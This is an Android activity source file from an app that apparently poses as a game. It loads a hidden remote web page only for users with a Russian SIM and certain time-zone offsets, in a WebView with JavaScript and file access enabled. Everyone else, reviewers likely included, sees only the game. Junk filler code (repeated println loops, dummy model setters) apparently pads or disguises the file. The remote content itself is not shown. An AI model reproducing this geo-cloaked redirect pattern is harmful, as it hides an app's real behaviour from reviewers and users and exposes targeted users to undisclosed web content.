package com.krocket.cporak;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.icu.util.TimeZone;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.MenuInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;


public class MainActivityMainAct extends AppCompatActivity {
    private static final String TAG = MainActivityMainAct.class.getSimpleName();
    private static final String TAG_FOR_SHA = "Base64";

    private static final String ISO_CODE_RU_1 = "ru";       // don't change value
    private static final String ISO_CODE_RU_2 = "rus";      // don't change value
    private static final String ALGORITHM_NAME = "SHA";     // don't change value

    private String mOpeningUrl;
    private String mRedirectKey;

    private ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        setContentView(R.layout.activity_main);

        mOpeningUrl = getString(R.string.opening_url);      // don't change value id
        mRedirectKey = getString(R.string.key_redirecting); // don't change value id
        progressBar = findViewById(R.id.progress);
        progressBar.setVisibility(View.VISIBLE);
        generateAndLogSHA();
        openWebView();
        for(int i = 0; i < 10; i++) {
            System.out.println("fdsfdsf");
            System.out.println("fdsfdsf");
            System.out.println("fdsfdsf");
        }
        Model model = new Model();
        model.setGper(1);
        model.setTest(3);
        model.setKoko("fds");
    }

    @SuppressLint("PackageManagerGetSignatures")
    private void generateAndLogSHA() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    getApplicationContext().getPackageName(),
                    PackageManager.GET_SIGNATURES
            );
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance(ALGORITHM_NAME);
                md.update(signature.toByteArray());

                Log.i(TAG_FOR_SHA, Base64.encodeToString(md.digest(), Base64.NO_WRAP));
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.d(TAG_FOR_SHA, e.getMessage(), e);

        } catch (NoSuchAlgorithmException e) {
            Log.d(TAG_FOR_SHA, e.getMessage(), e);
        }
    }

    public MainActivityMainAct() {
        super();
    }

    @Override
    public void setTheme(int resid) {
        super.setTheme(resid);
    }

    @Override
    protected void onPostCreate(@Nullable Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
    }

    @Nullable
    @Override
    public ActionBar getSupportActionBar() {
        return super.getSupportActionBar();
    }

    @Override
    public void setSupportActionBar(@Nullable Toolbar toolbar) {
        super.setSupportActionBar(toolbar);
    }

    @Override
    public MenuInflater getMenuInflater() {
        return super.getMenuInflater();
    }

    @Override
    public void setContentView(int layoutResID) {
        super.setContentView(layoutResID);
    }

    @Override
    public void setContentView(View view) {
        super.setContentView(view);
    }

    @Override
    public void setContentView(View view, ViewGroup.LayoutParams params) {
        super.setContentView(view, params);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void openWebView() {
        Log.d(TAG, "openWebView");

        if (isSimCardInserted() && isNeedTimeZones()) {
            progressBar.setVisibility(View.GONE);
            WebView webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!url.contains(mRedirectKey)) {
                        view.loadUrl(url);
                    } else {
                        openScreenGame();
                    }
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request,
                                            WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    openScreenGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request,
                                                WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    openScreenGame();
                }
            });
            WebSettings webSettings = webView.getSettings();
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(true);
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            webView.loadUrl(mOpeningUrl);
        } else {
            openScreenGame();
        }
    }

    private boolean isNeedTimeZones() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2,3,4,7,8,9,10,11,12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }
        return false;
    }

    private boolean isSimCardInserted() {
        String countryCodeValue = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null){
            countryCodeValue = ((TelephonyManager)
                    getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        } else {
            return false;
        }
        return countryCodeValue != null
                && (countryCodeValue.equalsIgnoreCase(ISO_CODE_RU_1)
                || countryCodeValue.equalsIgnoreCase(ISO_CODE_RU_2));
    }

    @NonNull
    public static Intent getMainActivityIntent(Context context) {
        return new Intent(context, MainActivityMainAct.class);
    }

    private void openScreenGame() {
        Log.d(TAG, "openScreenGame");
        progressBar.setVisibility(View.GONE);
        startActivity(GameActivityMainTop.getGameActivityIntent(this));
        finish();
    }
}
